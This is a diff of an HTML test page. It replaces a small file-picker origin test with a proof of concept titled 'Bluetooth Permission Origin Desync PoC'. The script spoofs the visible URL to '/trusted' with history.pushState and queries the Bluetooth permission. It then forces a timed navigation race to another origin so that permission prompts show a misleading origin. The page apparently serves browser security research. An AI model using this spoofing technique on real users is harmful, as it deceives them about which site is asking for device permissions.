@@ -1,32 +1,104 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker on Different Origin</title>
+<meta charset="utf-8">
+<title>Bluetooth Permission Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+}
+
+button {
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+
+#panel {
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
+}
+
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+}
+</style>
 </head>
+
 <body>
 
-<button id="fileButton">Pilih File</button>
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Request Bluetooth State</h2>
+  <p>Tap the button below to query Bluetooth permission state.</p>
+
+  <button onclick="checkBluetooth()">Check Bluetooth</button>
+  <p id="output">State: -</p>
+
+  <div class="notice">
+    Demo only — observe origin shown in permission / UI state
+  </div>
+</div>
 
 <script>
-    document.getElementById('fileButton').addEventListener('click', () => {
-        alert("Jika file picker muncul, maka masalah ini ada.");
-        
-        // Coba buka file picker
-        showOpenFilePicker({
-            types: [{
-                description: 'Image files',
-                accept: {'image/*': ['.png', '.jpg', '.jpeg']}
-            }]
-        })
-        .then(fileHandles => {
-            alert("File dipilih: " + fileHandles[0].name);
-        })
-        .catch(err => {
-            alert("Terjadi error: " + err);
-        });
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
+
+async function checkBluetooth() {
+  try {
+    if (!navigator.permissions) {
+      output.textContent = 'Permissions API not available';
+      return;
+    }
+
+    const status = await navigator.permissions.query({ name: 'bluetooth' });
+    output.textContent = `Bluetooth permission state: ${status.state}`;
+  } catch (e) {
+    output.textContent = 'Error querying Bluetooth permission';
+  }
+}
+
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+/*
+ * Step 2:
+ * Trigger navigation race during permission flow
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
     });
+  });
+});
 </script>
 
 </body>
